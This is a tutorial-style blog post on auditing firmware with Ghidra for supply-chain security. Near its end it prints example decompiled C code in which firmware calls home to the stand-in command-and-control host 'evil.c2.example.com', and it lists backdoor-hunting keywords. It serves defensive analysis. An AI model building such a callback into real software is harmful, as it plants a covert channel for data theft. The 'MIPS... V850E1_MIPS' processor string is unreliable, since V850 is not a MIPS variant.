---
title: "Deep Dive: Reverse Engineering Firmware with Ghidra for Supply Chain Security Audits"
date: 2026-08-28
category: "thought-leadership"
tags: ["firmware", "reverse-engineering", "ghidra", "supply-chain-security", "embedded-systems"]
# series: ""      # optional: set the same value on every part of a multi-part series
# seriesOrder: 1   # this post's position within that series
excerpt: "In the ever-expanding landscape of digital threats, supply chain security has emerged as a critical battleground. As an SVP of Information Security..."
---

# Deep Dive: Reverse Engineering Firmware with Ghidra for Supply Chain Security Audits

In the ever-expanding landscape of digital threats, supply chain security has emerged as a critical battleground. As an SVP of Information Security and Operations, I've seen firsthand how vulnerabilities lurking deep within hardware and firmware can compromise an entire infrastructure. While we often focus on software dependencies, the firmware embedded in network devices, IoT gadgets, and critical infrastructure components presents an equally, if not more, insidious risk.

Auditing firmware for malicious implants, backdoors, or critical vulnerabilities requires a specialized skillset and the right tools. Today, we're going to take a practical deep dive into using Ghidra, the open-source reverse engineering framework developed by the NSA, to analyze firmware images. This isn't about theoretical concepts; it's about getting our hands dirty with a real-world approach to supply chain security.

## Why Firmware Matters in Supply Chain Security

Think about it: a seemingly innocuous network switch from a lesser-known vendor could have firmware that calls home to an adversary's C2 server, or contains a hardcoded credential that bypasses all your network segmentation. A compromised industrial control system (ICS) component could lead to catastrophic operational failures. These aren't hypothetical scenarios; they are tangible threats that demand proactive investigation.

Traditional security audits often stop at the operating system or application layer. Firmware, however, operates at a much lower level, often without readily available source code. This is where reverse engineering becomes indispensable.

## Setting Up Your Ghidra Environment

First things first, you'll need Ghidra. You can download it from the official GitHub page ([https://github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)). It requires a Java Development Kit (JDK) to run. I recommend using the latest stable version of OpenJDK.

Once Ghidra is installed and running, you'll create a new project.

## Acquiring and Preparing Firmware for Analysis

The first challenge is often obtaining the firmware. This might involve:

1.  **Downloading from Vendor Websites:** The easiest route, but sometimes older or specific versions are hard to find.
2.  **Extracting from Devices:** Using tools like `flashrom` with a compatible programmer (e.g., a Raspberry Pi with `flashrom` for SPI flash) or JTAG/SWD debuggers to dump the firmware directly from the chip.
3.  **Intercepting Updates:** Capturing over-the-air (OTA) updates or network traffic during a device update.

For this example, let's assume we have a raw firmware image file, perhaps named `router_firmware.bin`.

## Loading Firmware into Ghidra

1.  **Launch Ghidra** and open your project.
2.  Go to `File -> Import File...` and select your `router_firmware.bin`.
3.  Ghidra will prompt you for **Language Selection**. This is crucial. If you know the architecture (e.g., ARM, MIPS, x86) of the embedded processor, select it. If not, you might need to guess or do some initial reconnaissance (e.g., checking strings in the binary for architecture indicators, or looking up the device's CPU specs). For many routers and IoT devices, ARM or MIPS are common. Let's assume MIPS for this example.
    *   **Endianness:** Also critical. Most MIPS embedded systems are big-endian. ARM can be either. Consult device documentation if unsure.
    *   **Processor Variant:** Select the specific MIPS variant (e.g., `MIPS:32:default:BE:V850E1_MIPS`).
4.  Ghidra will then ask for the **load address**. This is often the trickiest part. Firmware doesn't usually start at address `0x0`. It's loaded into a specific memory region by the bootloader.
    *   **Common Load Addresses:** `0x80000000` (for MIPS kernel images), `0xbfc00000` (for MIPS flash memory, often where bootloaders reside), `0x0` (for raw binaries that are mapped directly).
    *   **Heuristics:** Look for common bootloader magic numbers or string tables that might indicate an offset. Tools like `binwalk` can often help identify components within the firmware and their offsets. For example, `binwalk -E router_firmware.bin` can provide entropy analysis, and `binwalk -M router_firmware.bin` can recursively extract embedded filesystems. If `binwalk` identifies a MIPS kernel at a specific offset, that offset might be your load address.
    *   **Trial and Error:** Sometimes, you might need to try a few common addresses and see which one yields the most meaningful disassembly.

Let's assume we've identified a good load address, say `0x80000000` for a MIPS kernel image.

5.  After importing, double-click the imported file in the project tree to open it in the Code Browser. Ghidra will prompt you to **Analyze** the file. **Definitely click "Yes"** and use the default analysis options. This is where Ghidra performs its magic: disassembling, decompiling, identifying functions, and building cross-references.

## Navigating and Analyzing with Ghidra

Once analyzed, you'll see several windows:

*   **Listing:** The raw disassembly view.
*   **Decompile:** Ghidra's powerful decompiler, attempting to translate assembly into C-like pseudocode. This is your best friend for understanding logic.
*   **Symbol Tree:** Lists functions, labels, and data.
*   **Data Type Manager:** Shows recognized data structures.
*   **Strings:** A list of all null-terminated strings found in the binary. This is an excellent starting point for reconnaissance.

### Practical Steps for Supply Chain Auditing:

1.  **Start with Strings:**
    *   Go to `Window -> Defined Strings`.
    *   Look for sensitive keywords: `password`, `admin`, `root`, `backdoor`, `shell`, `SSH`, `telnet`, `HTTP`, `HTTPS`, `C2`, `update_server`, `debug`.
    *   Identify URLs, IP addresses, or domain names that seem suspicious or unexpected. Are there hardcoded URLs pointing to non-vendor update servers?
    *   **Actionable Takeaway:** If you find a hardcoded credential or a suspicious C2 domain, investigate its usage. Right-click the string in the `Strings` window and select `Show References To`. This will show you which functions access that string.

2.  **Examine Network-Related Functions:**
    *   In the `Symbol Tree`, look for functions related to networking: `socket`, `bind`, `listen`, `connect`, `send`, `recv`, `accept`, `HTTP_POST`, `HTTPS_GET`.
    *   **Actionable Takeaway:** Trace the call graphs of these functions. Does `connect` target a hardcoded IP address? Is data being exfiltrated? Is there an undocumented web server or listening port?

3.  **Search for Common Vulnerabilities:**
    *   **Buffer Overflows:** Look for functions like `strcpy`, `sprintf`, `memcpy` without size checks. While Ghidra's decompiler might simplify these, understanding the underlying assembly can reveal issues.
    *   **Command Injection:** Search for `system`, `execve`, `popen`. Analyze how arguments are constructed. Is user input directly passed to these functions?
    *   **Hardcoded Secrets:** Beyond strings, look for global variables that might store encryption keys, API tokens, or other sensitive data.
    *   **Actionable Takeaway:** When you find potential vulnerabilities, document the function, the specific code snippet, and the input vector if applicable.

4.  **Identify Obfuscation or Anti-Analysis Techniques:**
    *   Unusual jumps, self-modifying code, or highly convoluted control flow graphs might indicate an attempt to hide malicious functionality.
    *   **Actionable Takeaway:** If you suspect obfuscation, take extra time to manually trace execution paths and understand the true intent. Ghidra's `PCode` view can sometimes help simplify complex assembly instructions.

5.  **Look for Undocumented Functionality:**
    *   Are there functions that seem unrelated to the device's advertised purpose? Perhaps a hidden "maintenance" mode or a backdoor command handler?
    *   **Actionable Takeaway:** Compare the disassembled functionality with the device's official documentation. Any significant discrepancies warrant further investigation.

## Example: Tracing a Suspicious Network Connection

Let's say we found the string "evil.c2.example.com" in our firmware.

1.  In the `Strings` window, right-click "evil.c2.example.com" and select `Show References To`.
2.  This opens the `References` window, showing where this string is used. Double-click an entry to jump to the code that references it.
3.  You'll likely land in the `Listing` view, and the `Decompile` window will show the pseudocode.
4.  Examine the surrounding code. Is it being passed to a `connect` function? Is it part of a DNS lookup?
5.  Use Ghidra's **"Follow Call"** (right-click a function name and select `Follow Call` or `Follow Call (New Window)`) and **"Find References To"** (right-click a variable/function and select `Find References To`) features to trace the data flow and control flow.
6.  You might discover a function that periodically attempts to establish a connection to "evil.c2.example.com", perhaps sending device telemetry or receiving commands.

```c
// Example Pseudocode from Ghidra's Decompiler
void establish_c2_connection(void) {
    int socket_fd;
    struct sockaddr_in server_addr;
    char *c2_domain = "evil.c2.example.com"; // Found string reference!
    char ip_buffer[16];

    // Some DNS resolution logic (e.g., calling gethostbyname)
    // ...
    resolve_domain(c2_domain, ip_buffer);

    socket_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (socket_fd == -1) {
        // Error handling
        return;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(8443); // Suspicious port?
    inet_pton(AF_INET, ip_buffer, &server_addr.sin_addr);

    if (connect(socket_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        // Connection failed
        close(socket_fd);
        return;
    }

    // If connection succeeds, what happens next?
    // Data exfiltration? Command reception?
    handle_c2_traffic(socket_fd); // Investigate this function!
    close(socket_fd);
}
```

